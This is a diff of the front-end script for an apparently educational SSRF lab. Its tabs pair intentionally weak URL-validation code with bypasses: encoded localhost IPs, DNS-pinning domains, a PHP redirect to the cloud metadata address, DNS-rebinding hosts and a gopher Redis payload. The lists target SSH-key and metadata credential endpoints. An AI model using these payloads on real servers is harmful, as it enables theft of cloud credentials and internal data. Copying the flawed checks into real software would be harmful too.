-                '<h2 class="text-2xl font-bold mb-4">' + details.title + '</h2>' +
-                '<p class="text-teal-100 mb-4">' + details.description + '</p>' +
-                '<div class="bg-gray-900 rounded-lg p-4">' +
-                '<pre><code class="language-js">' + details.code + '</code></pre>' +
-                '</div>' +
-                '</div>';
-
-            // Attack Vectors section
-            html += '<div class="rounded-xl p-6 bg-red-950/40 text-red-100 shadow-lg border border-red-800/30">' +
-
-                '<h2 class="text-xl font-semibold mb-4">' + (details.bypassTitle || 'Attack Vectors') + '</h2>' +
-                '<p class="mb-4 text-red-200">' + details.vulnerability + '</p>';
-
-            // Special content for different defense types
-            if (details.encodingTable) {
-                html += '<div class="mb-4">' +
-                    '<h3 class="font-semibold mb-2">Different Encoding Formats:</h3>' +
-                    '<div class="overflow-x-auto">' +
-                    '<table class="w-full bg-gray-800 text-white rounded-lg text-sm">' +
-                    '<thead>' +
-                    '<tr class="border-b border-gray-600">' +
-                    '<th class="text-left p-3 font-semibold">Encoding Format</th>' +
-                    '<th class="text-left p-3 font-semibold">Private IP address</th>' +
-                    '<th class="text-left p-3 font-semibold">Encoded/Obfuscated format</th>' +
-                    '</tr>' +
-                    '</thead>' +
-                    '<tbody>' +
-                    '<tr class="border-b border-gray-700"><td class="p-3">Decimal encoding</td><td class="p-3"><code class="text-blue-300">127.0.0.1</code></td><td class="p-3"><code class="text-yellow-300">2130706433</code></td></tr>' +
-                    '<tr class="border-b border-gray-700"><td class="p-3">Decimal encoding</td><td class="p-3"><code class="text-blue-300">169.254.169.254</code></td><td class="p-3"><code class="text-yellow-300">2852039166</code></td></tr>' +
-                    '<tr class="border-b border-gray-700"><td class="p-3">Hex Encoding</td><td class="p-3"><code class="text-blue-300">127.0.0.1</code></td><td class="p-3"><code class="text-yellow-300">0x7f.0x0.0x0.0x1</code></td></tr>' +
-                    '<tr class="border-b border-gray-700"><td class="p-3">Octal Encoding</td><td class="p-3"><code class="text-blue-300">127.0.0.1</code></td><td class="p-3"><code class="text-yellow-300">0177.0.0.01</code></td></tr>' +
-                    '<tr class="border-b border-gray-700"><td class="p-3">Mixed Encoding</td><td class="p-3"><code class="text-blue-300">127.0.0.1</code></td><td class="p-3"><code class="text-yellow-300">0177.0.0.0x1</code></td></tr>' +
-                    '<tr><td class="p-3">Binary Encoding</td><td class="p-3"><code class="text-blue-300">127.0.0.1</code></td><td class="p-3"><code class="text-yellow-300">10101001111111101010100111111110</code></td></tr>' +
-                    '</tbody></table></div></div>';
-            }
-
-            if (details.bypassSteps) {
-                html += '<div class="mb-4">' +
-                    '<h3 class="font-semibold mb-2 text-red-100">How the bypass works:</h3>' +
-                    '<div class="space-y-3">';
-                details.bypassSteps.forEach(function(step, index) {
-                    html += '<div class="flex items-start gap-3">' +
-                        '<span class="flex-shrink-0 w-6 h-6 bg-red-600 text-white text-sm font-bold rounded-full flex items-center justify-center">' + (index + 1) + '</span>' +
-                        '<p class="text-red-200 leading-relaxed">' + step + '</p>' +
-                        '</div>';
-                });
-                    html += '</div>';
-                    
-                    // Add image for DNS Pinning Defense
-                    if (tab === 'defense2') {
-                        html += '<div class="text-center mt-4">' +
-                            '<img src="pinning.png" class="rounded mx-auto" alt="DNS Pinning Technique" style="padding: 18px; max-width: 100%;">' +
-                            '</div>';
-                    }
-                    
-                    html += '</div>';
-
-            }
-
-            if (details.toctouSteps) {
-                html += '<div class="mb-4">' +
-                    '<h3 class="font-semibold mb-2 text-red-100">TOCTOU Attack Process:</h3>' +
-                    '<div class="space-y-2">';
-                details.toctouSteps.forEach(function(step) {
-                    html += '<div class="flex items-start gap-3">' +
-                        '<span class="flex-shrink-0 w-2 h-2 bg-red-500 rounded-full mt-2"></span>' +
-                        '<p class="text-red-200 leading-relaxed">' + step + '</p>' +
-                        '</div>';
-                });
-                html += '</div>';
-                if (details.bypassNote) {
-                    html += '<p class="mt-3 text-red-300 italic">' + details.bypassNote + '</p>';
+                defense1: {
+                    title: "Defense 1: IP Blacklisting vs. Encoding Bypass",
+                    description: "The simplest solution used by developer to defend against SSRF attacks is evaluating an hostname/IP address against a blacklist. In this method, host-part of the user provided URL is matched against a backlist to ensure that it does not point to an internal service. If a match is found, the request is rejected by the protection mechanism.",
+                    code: "const url = req.query.url,\n    host = getLocation(url),\n    hostname = host.hostname;\n\nif (!check_proto.test(url)) {\n    return res.status(401).send('Invalid URL Format. Please specify Protocol (HTTP OR HTTPS)');\n}\n\n// Match the host part against the list of blacklist IP address.\nconst blackListIps = ['127.', '0.', '192.168', '10.', '169.254', '172.'],\n    isBlacklisted = blackListIps.some((pattern) => { return hostname.startsWith(pattern); });\n\n// make http request only if match pass\nif (isBlacklisted) {\n    return res.status(423).send('Action Blocked! You are trying to access restricted IP address');\n}\n\n// make a request to user provided url\nconst response = await axios.get(url);\n\nreturn res.send(response.data);",
+                    vulnerability: "The defense solution is bypassed by using different encoding schemes. (e.g., decimal-encoded version of 127.0.0.1 is 2130706433) and IPv6.",
+                    bypassTitle: "Bypass: Incomplete Blacklisting",
+                    defenseTechnique: "IP Address Blacklisting",
+                    attackTechnique: "IP Encoding Bypass",
+                    encodingTable: {
+                        "Decimal encoding (127.0.0.1)": "2130706433",
+                        "Decimal encoding (169.254.169.254)": "2852039166", 
+                        "Hex Encoding (127.0.0.1)": "0x7f.0x0.0x0.0x1",
+                        "Octal Encoding (127.0.0.1)": "0177.0.0.01",
+                        "Mixed Encoding (127.0.0.1)": "0177.0.0.0x1",
+                        "Binary Encoding (127.0.0.1)": "10101001111111101010100111111110"
+                    },
+                    payloads: [
+                        "http://2130706433:3000/ssh_key",
+                        "http://2852039166/latest/meta-data/", 
+                        "http://0x7f.0x0.0x0.0x1:3000/ssh_key",
+                        "http://0177.0.0.01:3000/ssh_key",
+                        "http://[::1]:3000/ssh_key",
+                        "http://google.com@127.0.0.1:3000/ssh_key",
+                        "http://127%2e0%2e0%2e1:3000/ssh_key"
+                    ]
+                },
+                defense2: {
+                    title: "Defense 2: Input Validation vs. DNS Pinning",
+                    description: "To avoid the limitations of blacklisting, some developers rely on libraries to disallow a URL which has a private IP address as its host component. However, this solution is not resilient against DNS pinning.",
+                    code: "const url = req.query.url,\n    hostname = getHostname(url);\n\nif (!check_proto.test(url)) {\n    return res.status(401).send('Invalid URL Format. Please specify Protocol (HTTP OR HTTPS)');\n}\n\n// check if IP address is valid\nif (ipaddr.isValid(hostname) && isPrivateIP(hostname)) {\n    return res.status(423).send('Action Blocked! You are trying to access restricted IP address');\n}\n\n// Check if domain name is valid\nif (!isValidDomain(hostname)) {\n    return res.status(400).send('Invalid domain name! Please use a valid domain name');\n}\n\n// make a request to user provided url\nconst response = await axios.get(url);\n\nreturn res.send(response.data);",
+                    vulnerability: "An attacker can use a hostname that resolves to a private IP to bypass the defense. It can be used by an attacker to bind a legit domain name to an internal IP address.",
+                    bypassTitle: "Bypass: DNS Pinning Technique",
+                    defenseTechnique: "Use proper IP detection",
+                    attackTechnique: "DNS Pinning Attack",
+                    bypassSteps: [
+                        "Attacker passes a domain like http://localtest.me:3000/ssh_key as URL parameter",
+                        "The hostname of this URL doesn't match with private IP blacklist. This will bypass all the defence",
+                        "Now axios library will internally resolved the IP address from hostname. DNS will be resolved to internal/private IP address",
+                        "Axios will return internal resource back to the user"
+                    ],
+                    payloads: [
+                        "http://169.254.169.254.nip.io/latest/meta-data/",
+                        "http://test.meta.rahuldhawan.me/latest/meta-data/",
+                        "http://127.0.0.1.nip.io:3000/ssh_key",
+                        "http://localtest.me:3000/ssh_key"
+                    ]
+                },
+                defense3: {
+                    title: "Defense 3: DNS Filtering vs. HTTP Redirection", 
+                    description: "Now, in order to mitigate DNS pinning issue, developers can check if the host component of a URL resolves to a private IP address by making a DNS query. However, this mitigation can be defeated by using HTTP Redirection Bypass Technique.",
+                    code: "const url = req.query.url,\n    hostname = getHostname(url);\n\nif (!check_proto.test(url)) {\n    return res.status(401).send('Invalid URL Format. Please specify Protocol (HTTP OR HTTPS)');\n}\n\n// check if IP address is valid\nif (ipaddr.isValid(hostname) && isPrivateIP(hostname)) {\n    return res.status(423).send('Action Blocked! You are trying to access restricted IP address');\n}\n\n// Check if domain name is valid\nif (!isValidDomain(hostname)) {\n    return res.status(400).send('Invalid domain name! Please use a valid domain name');\n}\n\ntry {\n    const address = await lookupPromise(hostname);\n\n    if (isPrivateIP(address)) {\n        return res.status(423).send('Action Blocked! Your domain name got resolved to ' + address);\n    }\n}\ncatch (err) {\n    if (err.code === 'ENOTFOUND') {\n        return res.send('invalidCustomDomainError: Couldn\\'t resolve domain name.');\n    }\n    throw err;\n}\n\n// make a request to user provided url\nconst response = await axios.get(url);\n\nreturn res.send(response.data);",
+                    vulnerability: "An attacker inputs a URL pointing to a page on a server controlled by an attacker. As this server has a public IP address, the check passes, and the page is visited. This page, in turn, redirects the vulnerable server to make a request to an internal service.",
+                    bypassTitle: "Bypass: HTTP Redirection Technique",
+                    defenseTechnique: "DNS Resolution Filtering", 
+                    attackTechnique: "HTTP Redirection Bypass",
+                    defenseTechnique: "Check where domains resolve",
+                    attackTechnique: "HTTP Redirection Technique",
+                    bypassSteps: [
+                        "Create a simple redirect script on any public hosting service (e.g., PHP: header('Location: http://169.254.169.254/latest/meta-data/');)",
+                        "Host this script on a public server (Cloudflare Workers, Replit, or any PHP hosting)",
+                        "The public URL passes DNS checks because it resolves to a public IP",
+                        "When accessed, it returns HTTP 302 redirect to internal services",
+                        "The application follows the redirect to 169.254.169.254 without validation"
+                    ],
+                    redirectSetup: {
+                            title: "Setup HTTP Redirect Attack:",
+                            steps: [
+                                {
+                                    title: "Step 1: Create Redirect Script",
+                                    code: "<?php\n/* Redirect to metadata service */\nheader('Location: http://169.254.169.254/latest/meta-data/');\n?>",
+                                    language: "php"
+                                },
+                                {
+                                    title: "Step 2: Host on Public Server",
+                                    options: [
+                                        "Cloudflare Workers - Free, instant deployment",
+                                        "Replit.com - Easy PHP hosting",
+                                        "Any free PHP hosting service"
+                                    ]
+                                },
+                                {
+                                    title: "Step 3: Use Public URL",
+                                    description: "Your redirect URL (e.g., https://your-app.workers.dev/) will pass DNS checks and redirect to internal services"
+                                }
+                            ]
+                        },
+                        additionalResources: {
+                        title: "Additional Resources:",
+                        links: [
+                            {
+                                text: "Open Redirect Payload List",
+                                url: "https://github.com/payloadbox/open-redirect-payload-list",
+                                description: "Comprehensive collection of HTTP redirect payloads and bypass techniques"
+                            }
+                        ]
+                    },
+                    payloads: [
+                        "http://localtest.me:3000/redirect"
+                    ]
+                },
+                defense4: {
+                    title: "Defence 4: Redirect Prevention vs. TOCTOU Vulnerability",
+                    description: "To prevent HTTP redirection bypass, developers disable redirects and add DNS resolution checks before making requests. This creates a two-step validation process: the first DNS lookup checks if the hostname resolves to a private IP, and the second DNS lookup occurs when actually making the HTTP request.\n But this introduces a Time-of-Check to Time-of-Use (TOCTOU) vulnerability. An attacker can serve different DNS responses between these two lookups - passing the security check with a public IP, then switching to a private IP for the actual request. This DNS rebinding attack exploits the time window between validation and use. \n\n So bascially, TOCTOu vulnerability can be exploited using DNS Rebinding Attack Technique.",
+                    code: "const url = req.query.url,\n    hostname = getHostname(url);\n\nif (!check_proto.test(url)) {\n    return res.status(401).send('Invalid URL Format. Please specify Protocol (HTTP OR HTTPS)');\n}\n\n// check if IP address is valid\nif (ipaddr.isValid(hostname) && isPrivateIP(hostname)) {\n    return res.status(423).send('Action Blocked! You are trying to access restricted IP address');\n}\n\n// Check if domain name is valid\nif (!isValidDomain(hostname)) {\n    return res.status(400).send('Invalid domain name! Please use a valid domain name');\n}\n\ntry {\n    const address = await lookupPromise(hostname);\n    console.log('resolved address => ', address);\n\n    if (isPrivateIP(address)) {\n        return res.status(423).send('Action Blocked! Your domain name got resolved to ' + address);\n    }\n}\ncatch (err) {\n    if (err.code === 'ENOTFOUND') {\n        return res.send('invalidCustomDomainError: Couldn\\'t resolve domain name.');\n    }\n    throw err;\n}\n\ntry {\n    // make a request to user provided url\n    const response = await axios.get(url, { maxRedirects: 0 });\n    console.log('response  => ', response);\n\n    return res.send(response.data);\n}\ncatch (e) {\n    return res.status(423).send('Action Blocked! We have blocked the redirection to protect our application against SSRF vulnerability');\n}",
+                    vulnerability: "Despite disabling redirects and checking DNS resolution, this defense can still be bypassed through DNS rebinding. The vulnerability exists because the application performs two separate DNS queries: first to validate the hostname (security check), and second when making the actual HTTP request. This time gap creates a race condition that attackers can exploit. \n Two DNS requests are made before an HTTP request is made to a target URL: Request 1: to check whether the host is pointing to a private IP address, Request 2: resolve the hostname to start a connection to the target server. Attackers take advantage of this by providing a URL pointing to their own server and have their DNS server serve two different DNS responses.",
+                    bypassTitle: "Bypass: DNS Rebinding Attack",
+                    defenseTechnique: "Block redirects too",
+                    attackTechnique: "DNS Rebinding Attack ",
+                    toctouSteps: [
+                        "First Response: a public IP address to pass the first check",
+                        "Second Response: A private IP address to achieve a request forgery to an internal service"
+                    ],
+                    bypassNote: "In short, if an attacker can change the DNS resolution result after time to check and before time of use, he can bypass the validator. DNS rebinding technique is used to targets TOCTOU type of vulnerabilities.",
+                    payloads: [
+                        "http://make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms/latest/meta-data/",
+                        "http://7f000001.01020304.rbndr.us:3000/ssh_key"
+                    ]
+                },
+                defense5: {
+                    title: "Defense 5: Comprehensive Defense vs. Protocol Smuggling",
+                    description: "A comprehensive solution that combines multiple techniques: strict input validation, DNS resolution caching, network-level controls, and request monitoring to prevent SSRF attacks effectively.",
+                    code: "// Comprehensive SSRF protection\nconst url = req.query.url;\nconst hostname = getHostname(url);\n\n// 1. Protocol validation\nif (!check_proto.test(url)) {\n    return res.status(401).send('Invalid URL Format');\n}\n\n// 2. Strict hostname validation\nif (!isValidPublicDomain(hostname)) {\n    return res.status(423).send('Only public domains allowed');\n}\n\n// 3. DNS resolution with caching and validation\nconst resolvedIP = await secureResolve(hostname);\nif (isPrivateIP(resolvedIP)) {\n    return res.status(423).send('Private IP access denied');\n}\n\n// 4. Network-level restrictions\nconst response = await secureRequest(url, {\n    maxRedirects: 0,\n    timeout: 5000,\n    allowedPorts: [80, 443],\n    networkPolicy: 'public-only'\n});\n\nreturn res.send(response.data);",
+                    vulnerability: "This defense implements multiple layers of protection, but may still be vulnerable to sophisticated attacks involving zero-day bypasses, protocol smuggling, or advanced DNS manipulation techniques.",
+                    bypassTitle: "Advanced Attack Vectors",
+                    defenseTechnique: "Multi-Layer Protection",
+                    attackTechnique: "Protocol Smuggling",
+                    advancedTechniques: [
+                        "Protocol smuggling and HTTP request splitting",
+                        "IPv6 bypass techniques and dual-stack exploitation", 
+                        "Cloud metadata service enumeration",
+                        "Internal service discovery via timing attacks",
+                        "WebSocket upgrade attacks and protocol switching"
+                    ],
+                    payloads: [
+                        "http://[::1]:3000/ssh_key",
+                        "http://metadata.google.internal/",
+                        "http://169.254.170.2/v2/metadata/",
+                        "gopher://127.0.0.1:6379/_INFO"
+                    ]
                 }
+            };
+
+            function updateDefenseButton(details) {
+                var button = document.querySelector('#defense-analysis button');
+                if (button && details.defenseTechnique && details.attackTechnique) {
+                    button.innerHTML = '<div>' +
+                        '<h3 class="text-lg font-semibold text-white">🔍 Security Analysis</h3>' +
+                        '<p class="text-gray-400 text-sm">Defensive Technique: <span class="bg-green-500/20 text-green-300 px-2 py-1 rounded font-medium">' + details.defenseTechnique + '</span> vs Attacker Technique: <span class="bg-red-500/20 text-red-300 px-2 py-1 rounded font-medium">' + details.attackTechnique + '</span></p>' +
+                        '</div>' +
+                        '<span id="defense-arrow" class="text-xl transform transition-transform">▼</span>';
+                }
+            }
+
+
+            function getPayloadDescription(payload) {
+                var descriptions = {
+                    // No Defense payloads
+                    "http://169.254.169.254/latest/meta-data/": "AWS EC2 metadata service - contains sensitive instance information",
+                    "http://169.254.169.254/latest/meta-data/iam/security-credentials/": "AWS IAM security credentials - highly sensitive",
+                    "http://127.0.0.1:3000/ssh_key": "Local SSH key endpoint - accessing internal application routes", 
+                    "http://0.0.0.0:3000/": "Alternative localhost representation",
+                    "http://localhost:22": "Local SSH service - port scanning internal services",
+                    
+                    // Defense 1 payloads (encoding bypasses)
+                    "http://2130706433:3000/ssh_key": "Decimal encoding of 127.0.0.1 - bypasses string pattern matching",
+                    "http://2852039166/latest/meta-data/": "Decimal encoding of 169.254.169.254 - AWS metadata access",
+                    "http://0x7f.0x0.0x0.0x1:3000/": "Hexadecimal IP encoding - represents 127.0.0.1",
+                    "http://0177.0.0.01:3000/": "Octal IP encoding - represents 127.0.0.1",
+                    "http://[::1]:3000/ssh_key":"IPv6 representations of Localhost" ,
+                    "http://google.com@127.0.0.1:3000/ssh_key": "Parser confusion with @ symbol",
+                    "http://127%2e0%2e0%2e1:3000/ssh_key": "URL encoding of dots",
+                    
+                    // Defense 2 payloads (DNS pinning)
+                    "http://169.254.169.254.nip.io/latest/meta-data/": "Domain that resolves to Metadata IP - DNS pinning attack",
+                    "http://test.meta.rahuldhawan.me/latest/meta-data/": "Another DNS service for Metadata IP resolution",
+                    "http://127.0.0.1.nip.io:3000/ssh_key": "Wildcard DNS service pointing to 127.0.0.1",
+                    "http://localtest.me:3000/ssh_key": "Public domain that resolves to 127.0.0.1",
+                    
+                    // Defense 3 payloads (HTTP redirection)
+                    "http://localtest.me:3000/redirect": "Attacker-controlled server that redirects to internal services",
+                    
+                    // Defense 4 payloads (TOCTOU/DNS rebinding)
+                    "http://make-127.0.0.1-rebind-169.254-169.254-rr.1u.ms/latest/meta-data/": "Using <a href='http://1u.ms/' class='text-blue-400 hover:text-blue-300 underline'>1u.ms tool</a> - serves different IPs on consecutive requests",
+                    "http://7f000001.01020304.rbndr.us:3000/ssh_key": "Using <a href='https://lock.cmpxchg8b.com/rebinder.html' class='text-blue-400 hover:text-blue-300 underline'>rbndr Tool Helper </a>. First DNS resolution points to Public IP and second to localhost ",
+                    
+                    // Defense 5 payloads (advanced techniques)
+                    "http://[::1]:3000/ssh_key": "IPv6 localhost bypass - targets internal services via IPv6",
+                    "http://metadata.google.internal/": "Google Cloud metadata service access",
+                    "http://169.254.170.2/v2/metadata/": "Alternative cloud metadata endpoint",
+                    "gopher://127.0.0.1:6379/_INFO": "Gopher protocol for Redis internal service access"
+                };
+                return descriptions[payload] || "Test payload for SSRF exploitation";
+            }
+
+            function stripHtmlTags(html) {
+                var tmp = document.createElement('div');
+                tmp.innerHTML = html;
+                return tmp.textContent || tmp.innerText || '';
+            }
+
+            function toggleDefenseAnalysis() {
+                var content = document.getElementById('defense-content');
+                var arrow = document.getElementById('defense-arrow');
                 
-                // Add TOCTOU image
-                html += '<div class="text-center mt-4">' +
-                    '<img src="toutoc.png" class="rounded mx-auto" alt="TOCTOU Race Condition" style="padding: 18px; max-width: 100%;">' +
-                    '</div>';
-                    
-                html += '</div>';
-            }
-
-            if (details.advancedTechniques) {
-                html += '<div class="mb-4">' +
-                    '<h3 class="font-semibold mb-2 text-red-100">Advanced Attack Techniques:</h3>' +
-                    '<div class="space-y-2">';
-                details.advancedTechniques.forEach(function(technique) {
-                    html += '<div class="flex items-start gap-3">' +
-                        '<span class="flex-shrink-0 w-2 h-2 bg-red-500 rounded-full mt-2"></span>' +
-                        '<p class="text-red-200 leading-relaxed">' + technique + '</p>' +
-                        '</div>';
-                });
-                html += '</div></div>';
-            }
-
-
-            // Payloads section
-            html += '<div class="border border-slate-500 rounded-lg bg-slate-800/50">' +
-                '<button onclick="togglePayloads(\'' + tab + '\')" class="w-full px-4 py-3 bg-red-800 hover:bg-red-700 text-red-100 rounded-t-lg text-left font-medium flex items-center justify-between transition-colors">' +
-                '<span>💣 Try these payloads</span>' +
-                '<span id="payload-arrow-' + tab + '" class="transform transition-transform">▼</span>' +
-                '</button>' +
-                '<div id="payloads-' + tab + '" class="hidden p-4 space-y-3">';
-
-            for (var i = 0; i < details.payloads.length; i++) {
-                var payload = details.payloads[i];
-                html += '<div class="bg-gray-900 rounded-lg p-3">' +
-                    '<div class="flex items-center gap-3 mb-2">' +
-                    '<input type="text" value="' + payload + '" class="flex-1 px-3 py-2 bg-gray-800 text-white rounded border border-gray-600 text-sm font-mono" id="payload-' + tab + '-' + i + '">' +
-                    '<button onclick="testPayload(\'' + tab + '\', ' + i + ')" class="px-4 py-2 bg-red-600 hover:bg-red-500 text-white rounded text-sm transition-colors">' +
-                    'Test' +
-                    '</button>' +
-                    '</div>' +
-                    '<div class="text-gray-300 text-xs">' + getPayloadDescription(payload) + '</div>' +
-                    '</div>';
-            }
-
-            html += '</div></div></div>';
-            
-            wrapper.innerHTML = html;
-            if (typeof Prism !== 'undefined') {
-                Prism.highlightAll();
-            }
-
-            // Update the defense button with dynamic content
-            updateDefenseButton(details);
-
-        }
-
-        function testCurrentEndpoint() {
-            var url = document.getElementById('url').value.trim();
-            if (!url) return;
-
-            var output = document.getElementById('output');
-            var code = document.getElementById('code');
-            var status = document.getElementById('status');
-            var initialMessage = document.getElementById('initial-message');
-            var btnText = document.getElementById('btn-text');
-            var spinner = document.getElementById('spinner');
-
-            btnText.textContent = 'Testing...';
-            spinner.classList.remove('hidden');
-            initialMessage.classList.add('hidden');
-            // Scroll to terminal section
-            document.querySelector('.terminal').scrollIntoView({ 
-                behavior: 'smooth', 
-                block: 'start' 
-            });
-
-
-            fetch('/' + currentTab + '?url=' + encodeURIComponent(url))
-                .then(function(response) {
-                    return response.text().then(function(text) {
-                        return { status: response.status, text: text };
-                    });
-                })
-                .then(function(result) {
-                    output.classList.remove('hidden');
-                    
-                    if (result.status === 423) {
-                        status.innerHTML = '❌ <span class="text-red-400">Blocked by ' + currentTab + '</span>';
-                        code.textContent = result.text;
-                    } else if (result.status === 200) {
-                        status.innerHTML = '✅ <span class="text-green-400">Success from ' + currentTab + '</span>';
-                        
-                        var cleanContent = stripHtmlTags(result.text);
-                        // code.textContent = cleanContent || result.text;
-                        var formattedContent = formatJsonOutput(cleanContent || result.text);
-                        code.textContent = formattedContent;
-
-                        
-                        if (url.indexOf('127.0.0.1') !== -1 || url.indexOf('localhost') !== -1 || url.indexOf('169.254') !== -1 || url.indexOf('0.0.0.0') !== -1) {
-                            output.classList.add('pulse-green');
-                            setTimeout(function() {
-                                output.classList.remove('pulse-green');
-                            }, 3000);
-                        }
-                    } else {
-                        status.innerHTML = '⚠️ <span class="text-yellow-400">Unexpected Status (' + result.status + ')</span>';
-                        code.textContent = result.text;
-                    }
-                })
-                .catch(function(err) {
-                    output.classList.remove('hidden');
-                    status.innerHTML = '❌ <span class="text-red-400">Network Error</span>';
-                    code.textContent = 'Error: ' + err.message;
-                })
-                .finally(function() {
-                    btnText.textContent = '🚀 Test';
-                    spinner.classList.add('hidden');
-                });
-        }
-
-        // Initialize when page loads
-        window.addEventListener('load', function() {
-            // Tab switching
-            var tabButtons = document.querySelectorAll('.tab-btn');
-            for (var i = 0; i < tabButtons.length; i++) {
-                tabButtons[i].addEventListener('click', function() {
-                    var allButtons = document.querySelectorAll('.tab-btn');
-                    for (var j = 0; j < allButtons.length; j++) {
-                        allButtons[j].classList.remove('active-tab');
-                    }
-                    this.classList.add('active-tab');
-                    
-                    currentTab = this.getAttribute('data-tab');
-                    // Reset terminal content
-                    document.getElementById('output').classList.add('hidden');
-                    document.getElementById('initial-message').classList.remove('hidden');
-                    document.getElementById('status').innerHTML = '';
-                    document.getElementById('code').textContent = '';
-
-                    // Reset defense analysis to collapsed state
-                    document.getElementById('defense-content').classList.add('hidden');
-                    document.getElementById('defense-arrow').style.transform = 'rotate(0deg)';
-                    
-                    // Clear URL input
-                    document.getElementById('url').value = '';
+                if (content.classList.contains('hidden')) {
+                    content.classList.remove('hidden');
+                    arrow.style.transform = 'rotate(180deg)';
                     renderTab(currentTab);
-                });
+                } else {
+                    content.classList.add('hidden');
+                    arrow.style.transform = 'rotate(0deg)';
+                }
             }
 
-            // Enter key to trigger test
-            var urlInput = document.getElementById('url');
-            if (urlInput) {
-                urlInput.addEventListener('keypress', function(e) {
-                    if (e.key === 'Enter') {
-                        testCurrentEndpoint();
-                    }
-                });
+            function formatJsonOutput(text) {
+                try {
+                    var jsonObj = JSON.parse(text);
+                    return JSON.stringify(jsonObj, null, 2);
+                } catch (e) {
+                    return text;
+                }
             }
-            // Initialize first tab
-            renderTab('nodefense');
-        });
-    </script>
-</body>
-</html>
+
+            function copyPayload(payload) {
+                if (navigator.clipboard) {
+                    navigator.clipboard.writeText(payload);
+                }
+            }
+
+            function toggleAbout() {
+                var aboutContent = document.getElementById('about-content');
+                var arrow = document.getElementById('about-arrow');
+                
+                if (aboutContent.classList.contains('hidden')) {
+                    aboutContent.classList.remove('hidden');
+                    arrow.style.transform = 'rotate(180deg)';
+                } else {
+                    aboutContent.classList.add('hidden');
+                    arrow.style.transform = 'rotate(0deg)';
+                }
+            }
+
+            function setExampleUrl(url) {
+                document.getElementById('url').value = url;
+            }
+
+            function togglePayloads(tab) {
+                var payloadsDiv = document.getElementById('payloads-' + tab);
+                var arrow = document.getElementById('payload-arrow-' + tab);
+                
+                if (payloadsDiv.classList.contains('hidden')) {
+                    payloadsDiv.classList.remove('hidden');
+                    arrow.style.transform = 'rotate(180deg)';
+                } else {
+                    payloadsDiv.classList.add('hidden');
+                    arrow.style.transform = 'rotate(0deg)';
+                }
+            }
+
+            function testPayload(tab, index) {
+                var payloadInput = document.getElementById('payload-' + tab + '-' + index);
+                var payload = payloadInput.value.trim();
+                if (!payload) return;
+                
+                document.getElementById('url').value = payload;
+                testCurrentEndpoint();
+            }
+
+            function renderTab(tab) {
+                var details = tabDetails[tab];
+                if (!details) return;
+
+                var wrapper = document.getElementById("tab-content");
+                
+                var html = '<div class="rounded-xl p-6 bg-teal-900/40 text-teal-50 shadow-lg border border-teal-700/50">' +
+                    '<h2 class="text-2xl font-bold mb-4">' + details.title + '</h2>' +
+                    '<p class="text-teal-100 mb-4">' + details.description + '</p>' +
+                    '<div class="bg-gray-900 rounded-lg p-4">' +
+                    '<pre><code class="language-js">' + details.code + '</code></pre>' +
+                    '</div>' +
+                    '</div>';
+
+                // Attack Vectors section
+                html += '<div class="rounded-xl p-6 bg-red-950/40 text-red-100 shadow-lg border border-red-800/30">' +
+
+                    '<h2 class="text-xl font-semibold mb-4">' + (details.bypassTitle || 'Attack Vectors') + '</h2>' +
+                    '<p class="mb-4 text-red-200">' + details.vulnerability + '</p>';
+
+                // Special content for different defense types
+                if (details.encodingTable) {
+                    html += '<div class="mb-4">' +
+                        '<h3 class="font-semibold mb-2">Different Encoding Formats:</h3>' +
+                        '<div class="overflow-x-auto">' +
+                        '<table class="w-full bg-gray-800 text-white rounded-lg text-sm">' +
+                        '<thead>' +
+                        '<tr class="border-b border-gray-600">' +
+                        '<th class="text-left p-3 font-semibold">Encoding Format</th>' +
+                        '<th class="text-left p-3 font-semibold">Private IP address</th>' +
+                        '<th class="text-left p-3 font-semibold">Encoded/Obfuscated format</th>' +
+                        '</tr>' +
+                        '</thead>' +
+                        '<tbody>' +
+                        '<tr class="border-b border-gray-700"><td class="p-3">Decimal encoding</td><td class="p-3"><code class="text-blue-300">127.0.0.1</code></td><td class="p-3"><code class="text-yellow-300">2130706433</code></td></tr>' +
+                        '<tr class="border-b border-gray-700"><td class="p-3">Decimal encoding</td><td class="p-3"><code class="text-blue-300">169.254.169.254</code></td><td class="p-3"><code class="text-yellow-300">2852039166</code></td></tr>' +
+                        '<tr class="border-b border-gray-700"><td class="p-3">Hex Encoding</td><td class="p-3"><code class="text-blue-300">127.0.0.1</code></td><td class="p-3"><code class="text-yellow-300">0x7f.0x0.0x0.0x1</code></td></tr>' +
+                        '<tr class="border-b border-gray-700"><td class="p-3">Octal Encoding</td><td class="p-3"><code class="text-blue-300">127.0.0.1</code></td><td class="p-3"><code class="text-yellow-300">0177.0.0.01</code></td></tr>' +
+                        '<tr class="border-b border-gray-700"><td class="p-3">Mixed Encoding</td><td class="p-3"><code class="text-blue-300">127.0.0.1</code></td><td class="p-3"><code class="text-yellow-300">0177.0.0.0x1</code></td></tr>' +
+                        '<tr><td class="p-3">Binary Encoding</td><td class="p-3"><code class="text-blue-300">127.0.0.1</code></td><td class="p-3"><code class="text-yellow-300">10101001111111101010100111111110</code></td></tr>' +
+                        '</tbody></table></div></div>';
+                }
+
+                if (details.bypassSteps) {
+                    html += '<div class="mb-4">' +
+                        '<h3 class="font-semibold mb-2 text-red-100">How the bypass works:</h3>' +
+                        '<div class="space-y-3">';
+                    details.bypassSteps.forEach(function(step, index) {
+                        html += '<div class="flex items-start gap-3">' +
+                            '<span class="flex-shrink-0 w-6 h-6 bg-red-600 text-white text-sm font-bold rounded-full flex items-center justify-center">' + (index + 1) + '</span>' +
+                            '<p class="text-red-200 leading-relaxed">' + step + '</p>' +
+                            '</div>';
+                    });
+                        html += '</div>';
+                        
+                        // Add image for DNS Pinning Defense
+                        // if (tab === 'defense2') {
+                        //     html += '<div class="text-center mt-4">' +
+                        //         '<img src="pinning.png" class="rounded mx-auto" alt="DNS Pinning Technique" style="padding: 18px; max-width: 100%;">' +
+                        //         '</div>';
+                        // }
+                        
+                        html += '</div>';
+
+                }
+
+                if (details.additionalResources) {
+                    html += '<div class="mt-4 p-4 bg-gray-800 rounded-lg">' +
+                        '<h3 class="font-semibold mb-2 text-yellow-300">' + details.additionalResources.title + '</h3>' +
+                        '<div class="space-y-2">';
+                    
+                    details.additionalResources.links.forEach(function(link) {
+                        html += '<div class="flex items-start gap-2">' +
+                            '<span class="text-gray-400">•</span>' +
+                            '<div>' +
+                            '<a href="' + link.url + '" target="_blank" class="text-blue-400 hover:text-blue-300 underline">' + link.text + '</a>' +
+                            '<p class="text-gray-400 text-sm mt-1">' + link.description + '</p>' +
+                            '</div>' +
+                            '</div>';
+                    });
+                    
